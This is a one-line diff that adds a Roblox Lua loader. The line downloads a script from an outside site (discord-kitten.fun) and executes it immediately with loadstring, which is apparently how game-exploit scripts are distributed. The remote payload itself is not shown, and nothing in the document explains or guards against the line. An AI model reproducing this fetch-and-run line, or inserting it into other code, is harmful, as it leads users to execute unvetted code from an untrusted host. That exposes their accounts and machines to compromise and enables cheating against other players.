@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://discord-kitten.fun/p/raw/pl6mjl4xoy"))()
